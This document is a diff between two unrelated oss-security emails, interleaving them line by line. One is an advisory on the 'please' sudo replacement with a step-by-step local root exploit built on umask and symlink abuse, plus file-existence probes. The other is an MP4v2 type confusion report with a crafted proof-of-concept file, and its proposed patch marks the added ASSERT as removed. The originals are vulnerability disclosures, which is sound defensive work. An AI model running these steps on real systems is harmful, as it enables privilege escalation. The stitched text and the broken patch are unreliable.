@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["9706" "Tuesday" "18" "May" "2021" "12:15:53" "+0200" "Matthias Gerstner" "mgerstner@suse.de" nil "260" "[oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility" nil nil nil "5" nil nil (number mark "U       mgerstner@su May 18  260/9706  " thread-indent "\"[oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6235" "Tuesday" "17" "July" "2018" "14:30:48" "+0800" "Ruikai Liu" "lrk700@gmail.com" "<CAB6DpjV_tb8s0O39dgocNk23cRK3TcQeAeA34wUhYkeXooM1wA@mail.gmail.com>" "175" "[oss-security] Type confusion in MP4v2 2.0.0" nil nil nil "7" "2018071706:30:48" "[oss-security] Type confusion in MP4v2 2.0.0" (number mark "U       lrk700@gmail Jul 17  175/6235  " thread-indent "\"[oss-security] Type confusion in MP4v2 2.0.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 24549 invoked by uid 550); 18 May 2021 10:16:06 -0000
+Received: (qmail 1470 invoked by uid 550); 17 Jul 2018 08:31:32 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,276 +12,212 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 24530 invoked from network); 18 May 2021 10:16:05 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Date: Tue, 18 May 2021 12:15:53 +0200
-From: Matthias Gerstner <mgerstner@suse.de>
-To: oss-security@lists.openwall.com
-Message-ID: <YKOT2W06Zbh45EJw@f195.suse.de>
+Received: (qmail 20446 invoked from network); 17 Jul 2018 06:31:12 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=0yhPMZBb/FmvgEbRRVOL1165eaPnG11NfrOm0HTgZ6I=;
+        b=Ik5ZN0vDW1AbUvUXFIoDNUZvcOHnwG/BleSYFerq3p+169GckasyT1gXeOVUnbeFlO
+         EnuLLfmZWebL53sRWHugK44tDr6P+apzAVOmiZBZ54/wGqeRI0xVPuruiqOywbrm+ijK
+         0zXTnznmQ/zmE7TbY/RrVJ4qgGx3aeaqZ4S0RJH456o5EJxfv+KDu1weebuM1c9NldEV
+         6ht2CyD+1MY6+TaJPdGfsVlV6HsqRNwAPfsgdVGUl5A4bAUaTlAvfd8FP1W+SQEjz3Ez
+         A5fU/jDJuxEMY/JMrYrDm0puTDUBJ/6ifaR7Z88VkETvyzaSV5MGTJTspBPV0vHdkdQC
+         oeKg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=0yhPMZBb/FmvgEbRRVOL1165eaPnG11NfrOm0HTgZ6I=;
+        b=EVtp3FQXECoxgbfMiu7YGCEQFtaYwLBT+e7d6YXthKXz5WPgUDpkqZPF3zQD1XejSz
+         ceeOc5j3B9LWfIjo0fnhLR3N46zRiXvPaG+0MKIBbncaq5cZQMSgOSDamcjDlDCUVlp9
+         xXAcI6G0ArW5veRKoszPCP+cKXiV3jEamDd1tnZh8Vf4pFJoVQwp/C62KiLArXDB5uk2
+         jPYO2sKBGC9XMKHDMN9LZ7ODzI3+OhW4CcyqjWrSjZuEIWUVvcA6s14NpbBBDLWSToVL
+         eDoAQM8DmHMiMDDlCkxX7w6tYmSVpPEA1ZHQIZMZnEY/U9+AY+Q3Gv9AU3wQTW7QKiBY
+         wrTw==
+X-Gm-Message-State: AOUpUlHgTXhcltGya5MYRLTZa3cbQF1qldBg0vCS448N1/9n6Xs/yAzL
+	pjjGXnzd+Jhg1pDxGtDuN8lon1SDGJkIsFWTp9J0MQ==
+X-Google-Smtp-Source: AAOMgpcQVNxe0CC93BNlmewLklEJZdOQnutUGERTaRYF/kj1OOkcX9Yk6fMEwhb84uvi1yHDVVx/8Do5tCc8OBc/j88=
+X-Received: by 2002:a24:e4cc:: with SMTP id o195-v6mr499078ith.145.1531809060168;
+ Mon, 16 Jul 2018 23:31:00 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
-	protocol="application/pgp-signature"; boundary="4S3/PEyenh29+g1C"
-Content-Disposition: inline
-Subject: [oss-security] please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root
- exploit and further security issues in sudo-like utility
+From: Ruikai Liu <lrk700@gmail.com>
+Date: Tue, 17 Jul 2018 14:30:48 +0800
+Message-ID: <CAB6DpjV_tb8s0O39dgocNk23cRK3TcQeAeA34wUhYkeXooM1wA@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] Type confusion in MP4v2 2.0.0
 
---4S3/PEyenh29+g1C
-Content-Type: text/plain; charset=iso-8859-1
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+Hi,
 
-Hello list,
+A type confusion bug is found in MP4v2 2.0.0, a legacy library dealing
+with MP4 media file.
 
-"please" [1] is a sudo replacement written in Rust. Its author requested
-a code review for inclusion of the setuid-root binary in openSUSE [2].
+========= ilst box =========
 
-I reviewed the source of please version 0.3.3 and found multiple
-security issues including a local root exploit (item 1.d) for users that
-are allowed to run a command. You can find the detailed report below.
+According to ref[2], MP4 file could contain an `ilst` box, which
+stands for item list. Tags such as album, author, etc., are stored
+here. A typical `ilst` box looks like this:
 
-# 1) Findings in `please`
+[ilst box] --> [nam box(full name)] -> [data box]
+         |---> [cmt box(comment)] -> [data box]
+         |---> [day box(created time)] -> [data box]
+         ...
 
-## a) Arbitrary File Existence Test and Arbitrary File Open via `-c`, `--ch=
-eck`
+MP4v2 would use `MP4ItemAtom` for nam/cmt/... box, and `MP4DataAtom`
+for data box:
 
-  Arbitrary file existence test and arbitrary file open as root is possible
-  via the `-c`, `--check` command line switch. This does not involve an
-  information leak but triggers kernel logic not usually available to regul=
-ar
-  users e.g. when sockets or special devices are involved. It also allows t=
-he
-  setuid-root program to run out-of-memory. Examples:
+ 772 MP4Atom*
+ 773 MP4Atom::factory( MP4File &file, MP4Atom* parent, const char* type )
+ 774 {
+ 775     // type may be NULL only in case of root-atom
+ 776     if( !type )
+ 777         return new MP4RootAtom(file);
+ 778
+ 779     // construct atoms which are context-savvy
+ 780     if( parent ) {
+ 781         const char* const ptype = parent->GetType();
+ 782
+ 783         if( descendsFrom( parent, "ilst" )) {
+ 784             if( ATOMID( ptype ) == ATOMID( "ilst" ))
+ 785                 return new MP4ItemAtom( file, type );
+ 786
+ 787             if( ATOMID( type ) == ATOMID( "data" ))
+ 788                 return new MP4DataAtom(file);
 
-  ```
-  # runs OOM
-  user$ please -c /dev/zero
-  Killed
+However, if a crafted MP4 file has the following structure:
 
-  # reads the full block device until OOM occurs
-  user$ please -c /dev/sda
-  Killed
+[ilst box] -> [ilst box] -> [data box]
 
-  # this file exists (in my case)
-  user$ please -c /root/.bash_history
-  Error parsing /root/.bash_history:712
-  Error parsing /root/.bash_history:716
-  Error parsing /root/.bash_history:1380
-  Error parsing /root/.bash_history:1382
-  # this doesn't exist
-  user$ please -c /root/.something
-  ```
+Then `MP4ItemAtom` would be created for the data box instead of
+`MP4DataAtom`, since its parent is still of type `ilst`.
 
-  The file existence test allows for a minimal information leak in terms of
-  the involved line numbers output in the error messages.
+========= type confusion =========
 
-## b) Arbitrary File Existence Test via the `search_path()` function
+Now, to parse the tag info of the MP4 file, `Tags::c_fetch` is called,
+which invokes `genericGetItems`:
 
-  Arbitrary file existence test is possible via the `search_path()` functio=
-n,
-  called in please.rs:254. Examples:
+293 MP4ItmfItemList*
+294 genericGetItems( MP4File& file )
+295 {
+296     MP4Atom* ilst = file.FindAtom( "moov.udta.meta.ilst" );
+297     if( !ilst )
+298         return __itemListAlloc();
+299
+300     const uint32_t itemCount = ilst->GetNumberOfChildAtoms();
+301     if( itemCount < 1 )
+302         return __itemListAlloc();
+303
+304     MP4ItmfItemList& list = *__itemListAlloc();
+305     __itemListResize( list, itemCount );
+306
+307     for( uint32_t i = 0; i < list.size; i++ )
+308         __itemAtomToModel( *(MP4ItemAtom*)ilst->GetChildAtom( i ),
+list.elements[i] );
+309
+310     return &list;
+311 }
 
-  ```
-  # this file doesn't exist
-  user$ please /root/.something
-  [please]: command not found
+Here we first find the atom for `ilst`, and then iterate its child
+atoms. Remember that there's a duplicate `ilst` in the crafted MP4
+file, in which case the root `ilst` atom's child is a `MP4ItemAtom` of
+type `ilst`, and its grandchild is a `MP4ItemAtom` of type `data`.
 
-  # this file exists (in my case)
-  user$ please /root/.bash_history
-  You may not execute "/root/.bash_history" on <host> as root
-  ```
+Then in the function `__itemAtomToModel`, the `MP4ItemAtom` of type
+`ilst` is parsed:
 
-## c) Arbitrary file existence test via the `-d` switch
+153 static bool
+154 __itemAtomToModel( MP4ItemAtom& item_atom, MP4ItmfItem& model )
+...
+193     // pass 2: populate data model
+194     for( uint32_t i = 0, idata = 0; i < childCount; i++ ) {
+195         MP4Atom* atom = item_atom.GetChildAtom( i );
+196         if( ATOMID( atom->GetType() ) != ATOMID( "data" ))
+197             continue;
+198
+199         MP4DataAtom& data_atom = *(MP4DataAtom*)atom;
 
-  This one also allows differentiation between dirs and files.
+We can see that line 199 would cast its child to `MP4DataAtom`
+directly, which in fact is a `MP4ItemAtom`. Since these two objects
+are of different layout, operations on the `data_atom` could lead to
+memory corruption due to the type confusion.
 
-  ```
-  # here /root/.gnupg exists and is a directory
-  user$ please -d /root/.gnupg cat /etc/fstab
-  [<fstab content>]
+========= POC =========
 
-  # here /root/.bash_history exists but is not a directory
-  user$ please -d /root/.bash_history cat /etc/fstab
-  Cannot cd into /root/.bash_history: Not a directory (os error 20)
+Here we create a MP4 file with two `ilst`s:
 
-  # here /root/.something does not exist at all
-  user$  please -d /root/.something  cat /etc/fstab
-  Cannot cd into /root/.something: No such file or directory (os error 2)
-  ```
+root@debian:~# xxd c3.mp4
+00000000: 0000 0018 6674 7970 6d70 3432 0000 0000  ....ftypmp42....
+00000010: 6d70 3432 6973 6f6d 0000 00b8 6d6f 6f76  mp42isom....moov
+00000020: 0000 006c 6d76 6864 0000 0000 1234 5678  ...lmvhd.....4Vx
+00000030: 2345 6789 0000 0258 9876 5432 0987 6543  #Eg....X.vT2..eC
+00000040: 5600 0000 0000 0000 0000 0000 0000 0000  V...............
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 dead beef 0000 0044  ...............D
+00000090: 7564 7461 0000 003c 6d65 7461 0000 0000  udta...<meta....
+000000a0: 0000 0030 696c 7374 0000 0028 696c 7374  ...0ilst...(ilst
+000000b0: 0000 0008 6461 7461 0000 0008 6461 7461  ....data....data
+000000c0: 0000 0008 6461 7461 0000 0008 6461 7461  ....data....data
 
-## d) The Token Dir "/var/run/pleaser/token" is Created with Unsanitized um=
-ask
+It results in segfault when running `mp4info`:
 
-  The token dir "/var/run/pleaser/token", if not existing, is created via
-  Rust's `create_dir_all` and the process's umask is not sanitized. This
-  allows the unprivileged user to influence the resulting directory
-  permissions:
+root@debian:~# mp4info c3.mp4
+mp4info version -r
+c3.mp4:
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr
+ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak
+Track   Type    Info
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr
+ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak
+Segmentation fault
 
-  ```
-  # the directory must not yet exist. If it does, a reboot can help out.
-  test -d /var/run/please && echo "token dir already exists, won't work!"
-  # clear umask
-  user$ umask 0
+root@debian:~#
+root@debian:~# dpkg -s mp4v2-utils
+Package: mp4v2-utils
+Status: install ok installed
+Priority: optional
+Section: sound
+Installed-Size: 300
+Maintainer: Debian Multimedia Maintainers
+<pkg-multimedia-maintainers@lists.alioth.debian.org>
+Architecture: amd64
+Source: mp4v2 (2.0.0~dfsg0-5)
+Version: 2.0.0~dfsg0-5+b1
+Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.14), libgcc1 (>=
+1:3.0), libstdc++6 (>= 5.2)
 
-  # run some arbitrary command, this needs to be allowed via /etc/please.ini
-  # but whether the password is successfully entered or not is unimportant
-  # at this point.
-  user$ please cat /etc/fstab
-  [please] password for user: ^C
+========= fix =========
 
-  # now the directories should have been created world-writable
-  user$ ls -lhd /var/run/please /var/run/please/token
-  drwxrwxrwx 3 root root 60 31. M=E4r 13:48 /var/run/please/
-  drwxrwxrwx 2 root root 40 31. M=E4r 13:48 /var/run/please/token
+The bug is caused by the wrong assumption that the child of an `ilst`
+can never be an `ilst`. So we could fix it by simply adding an ASSERT:
 
-  # now to grant us access to arbitrary configured commands w/o entering the
-  # user password
-  user$ touch /var/run/please/token/$USER:`tty | tr '/' '_'`:$$
+--- src/mp4atom.cpp     2018-07-17 11:37:01.266702613 +0800
++++ ../mp4v2-2.0.0-orig/src/mp4atom.cpp 2018-07-17 14:20:54.986316212 +0800
+@@ -783,6 +783,7 @@
 
-  # should now work w/o password
-  user$ please cat /etc/fstab
-  [<fstab content>]
+         if( descendsFrom( parent, "ilst" )) {
+             if( ATOMID( ptype ) == ATOMID( "ilst" ))
+-                ASSERT(ATOMID( type ) != ATOMID( "ilst" ));
+                 return new MP4ItemAtom( file, type );
 
-  # since symlinks are also followed in the token directory we can now crea=
-te
-  # new world-writable files anywhere in the system after authentication
-  # succeeds. Already existing files can be truncated to size 0 this way.
-  user$ cd /var/run/please/token
-  user$ rm -f $USER:*
-  user$ ln -s /etc/tmpfiles.d/supersafe.conf $USER:`tty | tr '/' '_'`:$$
-  user$ please cat /etc/fstab
-  [please] password for user: <actual password>
+             if( ATOMID( type ) == ATOMID( "data" )) {
 
-  # the file should now have been created world-writable
-  user$ ls -l /etc/tmpfiles.d/supersafe.conf
-  -rw-rw-rw- 1 root root 0 31. M=E4r 13:57 /etc/tmpfiles.d/supersafe.conf
-  # write some interesting content in there
-  user$ echo "d /root 0777 root root -" >/etc/tmpfiles.d/supersafe.conf
-  # reboot the local system e.g. via power button or display manager, then.=
-..
-  user$ ls -lhd /root
-  drwxrwxrwx 10 root root 4.0K 31. M=E4r 13:46 /root/
-  ```
 
-  So this more or less allows anybody who is allowed to execute at least one
-  command with password authentication to perform a full local root exploit.
 
-## 2) Findings in `pleaseedit`
+========= Reference =========
 
-## a) Predictable Temporary File Names in /tmp and the Target Directory
+[1] https://code.google.com/archive/p/mp4v2/
+[2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt
 
-  pleaseedit uses predictable paths in /tmp and in the target directory via
-  the functions `tmp_edit_file_name()` and `source_tmp_file_name()` and
-  possibly others. Without the Linux kernel's symlink protection this would
-  allow arbitrary file overwrite and ownership change if a regular user is
-  allowed to edit any file via pleaseedit.
+-- 
+Best regards,
 
-  Here is an excerpt of system calls performed in /tmp when editing /etc/fs=
-tab
-  successfully:
-
-  ```
-  statx(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", AT_STATX_SYNC_AS_STAT,=
- TA_ALL, 0x7fff21e4cd60) =3D -1 ENOENT (No such file or directory)
-  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", _WNLY|O_CREAT|O_TRUNC=
-|O_CLOEXEC, 0100600) =3D 4
-  chown("/tmp/pleaseedit.user._etc_fstab", 1000, 100) =3D 0
-  fchmodat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", 0600) =3D 0
-  execve("/usr/bin/cat", ["/usr/bin/cat", "/tmp/pleaseedit.user._etc_m"...]=
-, x55afc490f0 /* 74 vars */) =3D 0
-  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", O_RDONLY) =3D 3
-  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", O_RDONLY|O_CLOEXEC) =
-=3D 3
-  unlink("/tmp/pleaseedit.user._etc_fstab") =3D 0
-  ```
-
-  So the `openat()` calls do not include the `O_NOFOLLOW` flag to explicitly
-  protect against symlinks existing there. Furthermore these paths should
-  really be unpredictable in an `mkstemp()` manner.
-
-  The `chown()` call would allow for a full local root exploit if not for t=
-he
-  symlink protection mechanism. A race condition needs to be won, however,
-  because the code tries to remove an existing file in this location first.
-
-  In the target directory `pleaseedit` also potentially follows symlinks:
-
-  ```
-  openat(AT_FDCWD, "/etc/fstab.pleaseedit.copy.user", _WNLY|O_CREAT|O_TRUNC=
-|O_CLOEXEC, 0100600) =3D 4
-  ```
-
-  So if the target directory is under control of a non-root user then this
-  could also allow privilege escalation, this time there isn't even symlink
-  protection available, because the target directory will not be
-  sticky/world-writable. It requires two user accounts to "work
-  together", however, the user that is invoking `please` and the user
-  that is owning the target directory.
-
-# Bugfixes
-
-I discussed and reviewed fixes for these issues (and for a couple of
-other recommendations I gave) with the upstream author and they are part
-of the v0.4.0 upstream release.
-
-# CVE assignments
-
-- CVE-2021-31153: cummulative for all file and directory existence tests
-  corresponding to findings 1.a, 1.b and 1.c.
-- CVE-2021-31154: for the predictable temporary filenames in pleaseedit
-  corresponding to finding 2.a.
-- CVE-2021-31155: for the missing sanitation of the umask corresponding to
-  finding 1.d.
-
-# Conclusion
-
-Correctly implementing setuid-root binaries remains a challenge also in
-modern programming languages like Rust. While the general design of
-'please' was rather clean it was not implemented setuid aware at all.
-
-# Timeline
-
-2021-03-17: Review request was created
-2021-04-01: I shared the security findings with the upstream author and
-            offered coordinated disclosure.
-2021-04-14: I reviewed the final batch of fixes and we agreed on them.
-2021-05-17: The embargo time frame was unclear for a longer time
-            since Debian Linux updates needed to be prepared, but the
-	    upstream author already published the fixes on Gitlab. I
-	    received the official okay for publishing the full report
-	    only now.
-
-[1]: https://gitlab.com/edneville/please.git
-[2]: https://bugzilla.suse.com/show_bug.cgi?id=3D1183669
-
---=20
-Matthias Gerstner <matthias.gerstner@suse.de>
-Dipl.-Wirtsch.-Inf. (FH), Security Engineer
-https://www.suse.com/security
-Phone: +49 911 740 53 290
-GPG Key ID: 0x14C405C971923553
-=20
-SUSE Software Solutions Germany GmbH
-HRB 36809, AG N=FCrnberg
-Gesch=E4ftsf=FChrer: Felix Imend=F6rffer
-
---4S3/PEyenh29+g1C
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmCjk9kACgkQFMQFyXGS
-NVP+Lw//T2+i+b4kDB5CQhpEVoy5Ik0VDDcHGOjL0wlaCUc1lNzqdOduqf5huTpn
-Hi7bdQnEh2FwWs7/mEZvJyJofG/1/PsnRuwaOCfwg8LEPli2bd0At4Gni3vqy2pz
-FDFrleoGCiA5uCkCk2PmoIGrJGFK8xTUkmoEm6nsy9hQn7hzgyYPWZk6xWyFvjLc
-XAjL/w6RIKvz/Kwh/oLCK8UuXVrIDIVlDDjhom37D5IJjPnzBgx3rPOPiDty639s
-3/akpa7kYVZ9lBovO9pFk4aZ9lDuTrOD7IqjcKRHG37Npa64jPSplLt5EvfVbw1W
-HBMP9lYBKQUpeMWbiSVmRS6Qp3rXmQBcX/T2TKx6CML6saYzxsgDOKbVw9P/tL+7
-UA4FQx5UNMAVtUgTs6UUVcuVdbL8sEWJNtysLqZqemN46MxDQGJo3sYQksWm9O5a
-IcyN72boB9yoKwv3Kqlta1YthfRFDIPJAQ1ljyV3nZDvhhJSQVlYzG1zayqtdIN2
-zP9MZ/63jaMkn3OqS5jdEay6F+6rM8EwXuWEdOfXDfy4KTAH9We0vVSaGipYFX7V
-Tao68A4vzDgGNz8LfD2eOmA/Iz62LD4K9ycIaMl/EAB4gcxNWcxSejEA1dmV+4lw
-QWmgS0jQTr/v8qp45TL1Mvr4Il5KXODyG5x7rWo77U3dOdmV/y8=
-=FeP1
------END PGP SIGNATURE-----
-
---4S3/PEyenh29+g1C--
+Ruikai Liu
